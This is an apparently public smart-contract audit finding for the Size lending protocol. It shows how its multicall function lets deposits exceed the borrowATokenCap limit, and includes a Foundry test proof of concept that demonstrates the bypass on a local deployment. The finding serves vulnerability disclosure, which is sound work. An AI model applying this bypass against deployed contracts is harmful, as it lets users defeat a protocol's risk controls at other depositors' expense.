# Vulnerability details

## Impact
Anyone can bypass the `borrowATokenCap` limitation by calling [`Size#multicall()`](https://github.com/code-423n4/2024-06-size/blob/main/src/Size.sol#L142-L150) to deposit `USDC`.

## Proof of Concept
The protocol allows anyone to deposit `USDC` as borrowable asset.
`borrowATokenCap` is used to limit the maximum amount of borrowable assets that can be deposited in the protocol.

However, when [`Size#multicall()`](https://github.com/code-423n4/2024-06-size/blob/main/src/libraries/Multicall.sol#L26-L45) is called, the `borrowAToken` balance of `Size` is mistakenly used for the `borrowATokenCap` check, resulting in the limitation being bypassed.

Copy below codes to [DepositValidation.t.sol](https://github.com/code-423n4/2024-06-size/blob/main/test/local/actions/DepositValidation.t.sol) and run `forge test --match-test test_Deposit_validation_bypassBorrowATokenCap`
```solidity
    function test_Deposit_validation_bypassBorrowATokenCap() public {
        uint256 amount = 4_000_000;
        _mint(address(weth), alice, amount * 1e18);
        _mint(address(usdc), alice, amount * 1e6);
        _approve(alice, address(weth), address(size), amount * 1e18);
        _approve(alice, address(usdc), address(size), amount * 1e6);

        vm.startPrank(alice);
        size.deposit(DepositParams({token: address(weth), amount: amount * 1e18, to: alice}));
        //@audit-info alice's usdc depositing is reverted due to borrowATokenCap limitation
        vm.expectRevert(
            abi.encodeWithSelector(
                Errors.BORROW_ATOKEN_CAP_EXCEEDED.selector, size.riskConfig().borrowATokenCap, amount * 1e6
            )
        );
        size.deposit(DepositParams({token: address(usdc), amount: amount * 1e6, to: alice}));
        //@audit-info however, the borrowATokenCap limitation can be bypassed though multicall()
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeCall(size.deposit, (DepositParams({token: address(usdc), amount: amount * 1e6, to: alice})));
        size.multicall(data);
        assertEq(size.riskConfig().borrowATokenCap, 1_000_000e6);
        assertEq(size.data().borrowAToken.totalSupply(), 4_000_000e6);
    }
```
